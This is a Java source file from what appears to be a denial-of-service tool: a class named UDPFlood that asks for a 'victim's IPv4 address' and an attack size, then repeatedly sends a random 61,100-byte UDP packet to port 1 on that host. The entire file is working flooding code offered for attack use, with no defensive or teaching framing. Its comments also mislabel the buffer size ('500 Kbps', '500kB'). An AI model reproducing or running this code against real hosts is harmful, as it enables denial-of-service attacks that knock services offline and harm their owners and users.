package attack;

import utils.LoggingUtils;
import utils.ProgressBarUtils;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;
import java.util.concurrent.TimeUnit;

public class UDPFlood extends LoggingUtils {

    public UDPFlood() throws IOException {
        final InetAddress address = InetAddress.getByName(getUserInput("Enter victim's IPv4 address: "));

        log("building 500kB byte array...");

        byte[] b = new byte[61100]; // 500 Kbps
        new Random().nextBytes(b);

        log("creating socket...");

        final DatagramSocket socket = new DatagramSocket();

        log("building packet...");

        final DatagramPacket packet
                = new DatagramPacket(b, b.length, address, 1);

        log("packet successfully built for port 1!");

        final int mbpsCount = Integer.parseInt(getUserInput("Enter attack size (in Mbps): "));

        log("adjusting mbps count...");

        final long startTime = System.currentTimeMillis();

        log("timer started, sending packets. please wait...");

        log("starting progress bar util...");

        info("Sending " + mbpsCount + "mbps over " + address.getHostAddress() + ", please wait...");

        for (int i = 0; i < (mbpsCount * 2); i++) {

            ProgressBarUtils.printProgress(startTime, (mbpsCount * 2L), i);

            socket.send(packet);
        }

        log("every packet was sent over.                                                                                                               ");

        exitSuccess("Done! | Sent " + mbpsCount + " Mbits | To " + address.getHostAddress() + " | In " + String.format("%d min %d sec",
                TimeUnit.MILLISECONDS.toMinutes(System.currentTimeMillis() - startTime),
                TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis() - startTime) -
                        TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(System.currentTimeMillis() - startTime))
        ) + " (" + (System.currentTimeMillis() - startTime) + " ms)");
    }

}
